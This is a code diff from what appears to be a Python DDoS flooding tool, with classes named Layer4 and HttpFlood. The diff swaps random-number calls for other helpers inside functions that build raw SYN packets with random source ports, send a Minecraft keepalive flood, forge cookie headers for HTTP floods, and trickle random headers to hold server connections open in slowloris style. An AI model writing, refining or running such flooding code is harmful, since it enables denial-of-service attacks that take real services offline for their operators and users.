@@ -9,8 +9,7 @@ from math import log2, trunc
 from multiprocessing import RawValue
 from os import urandom as randbytes
 from pathlib import Path
-from random import choice as randchoice
-from random import randint
+from secrets import choice as randchoice
 from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM,
                     SOCK_RAW, SOCK_STREAM, TCP_NODELAY, gethostbyname,
                     gethostname, socket)
@@ -156,7 +155,7 @@ class Tools:
 
     @staticmethod
     def randchr(lengh: int) -> str:
-        return "".join([chr(randint(0, 1000)) for _ in range(lengh)]).strip()
+        return str(ProxyTools.Tools.rand_char(lengh)).strip()
 
     @staticmethod
     def send(sock: socket, packet: bytes):
@@ -412,7 +411,7 @@ class Layer4(Thread):
             sleep(1.5)
 
             c = 360
-            while Tools.send(s, Minecraft.keepalive(randint(1111111, 9999999))):
+            while Tools.send(s, Minecraft.keepalive(ProxyTools.Random.rand_int(1111111, 9999999))):
                 c -= 1
                 if c:
                     continue
@@ -463,7 +462,7 @@ class Layer4(Thread):
         tcp: TCP = TCP()
         tcp.set_SYN()
         tcp.set_th_dport(self._target[1])
-        tcp.set_th_sport(randint(1, 65535))
+        tcp.set_th_sport(ProxyTools.Random.rand_int(1, 65535))
         ip.contains(tcp)
         return ip.get_packet()
 
@@ -647,7 +646,7 @@ class HttpFlood(Thread):
             " _gat=1;"
             " __cfduid=dc232334gwdsd23434542342342342475611928;"
             " %s=%s\r\n" %
-            (randint(1000, 99999), ProxyTools.Random.rand_str(6),
+            (ProxyTools.Random.rand_int(1000, 99999), ProxyTools.Random.rand_str(6),
              ProxyTools.Random.rand_str(32)))
         s = None
         with suppress(Exception), self.open_connection() as s:
@@ -921,7 +920,7 @@ class HttpFlood(Thread):
                 Tools.send(s, payload)
             while Tools.send(s, payload) and s.recv(1):
                 for i in range(self._rpc):
-                    keep = str.encode("X-a: %d\r\n" % randint(1, 5000))
+                    keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
                     Tools.send(s, keep)
                     sleep(self._rpc / 15)
                     break
